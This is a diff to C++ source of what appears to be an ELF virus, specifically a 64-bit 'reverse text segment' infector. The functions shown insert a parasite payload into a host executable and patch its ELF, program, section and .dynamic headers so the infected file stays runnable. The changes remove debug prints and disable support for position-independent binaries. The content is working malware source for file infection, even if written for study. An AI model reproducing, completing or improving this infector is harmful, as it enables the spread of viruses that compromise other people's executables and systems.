@@ -103,7 +103,9 @@ void patch_ehdr(Elf64_Ehdr& ehdr, const ElfReverseTextInfo& info,
       ehdr.e_entry += sizeof(Elf64_Ehdr);
     }
   } else {
-    ehdr.e_entry = info.original_code_segment_file_offset - padded_virus_size;
+    printf("DYN not supported\n");
+    CHECK_FAIL();
+    // ehdr.e_entry = info.original_code_segment_file_offset - padded_virus_size;
   }
   // section header always comes after the virus.
   ehdr.e_shoff += padded_virus_size;
@@ -199,7 +201,7 @@ size_t inject_virus(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
     // If CODE includes ehdr, inject after it.
     virus_insert_offset += sizeof(Elf64_Ehdr);
   }
-  printf("inserted virus at offset 0x%x\n", virus_insert_offset);
+
   // Shift old content back.
   memcpy(host_mapping.mutable_base() + virus_insert_offset + padded_virus_size,
          host_mapping.mutable_base() + virus_insert_offset,
@@ -231,7 +233,6 @@ bool reverse_text_infect64(
       *reinterpret_cast<const Elf64_Phdr*>(host_mapping.base() + ehdr.e_phoff);
 
   if (!get_info(ehdr, phdr, info)) {
-    printf("Cannot correctly parse host elf phdr\n");
     return false;
   }
 
@@ -244,21 +245,18 @@ bool reverse_text_infect64(
         host_mapping.mutable_base() + ehdr.e_shoff);
     // Patch .dynamic section if we touched .gnu.hash
     patch_dyamic(host_mapping, ehdr, shdr, info, padded_virus_size);
-    printf("patched dynamic\n");
   }
 
   {
     auto& mutable_phdr = *reinterpret_cast<Elf64_Phdr*>(
         host_mapping.mutable_base() + ehdr.e_phoff);
     patch_phdr(ehdr, mutable_phdr, padded_virus_size, info);
-    printf("patched phdr\n");
   }
 
   {
     auto& mutable_shdr = *reinterpret_cast<Elf64_Shdr*>(
         host_mapping.mutable_base() + ehdr.e_shoff);
     patch_sht(ehdr, mutable_shdr, padded_virus_size, info);
-    printf("patched sht\n");
   }
 
   {
@@ -267,7 +265,6 @@ bool reverse_text_infect64(
         *reinterpret_cast<Elf64_Ehdr*>(host_mapping.mutable_base());
     patch_ehdr(mutable_ehdr, info, padded_virus_size);
   }
-  printf("patched ehdr\n");
 
   auto virus_offset = inject_virus(host_mapping, parasite_mapping, ehdr,
                                    padded_virus_size, info);
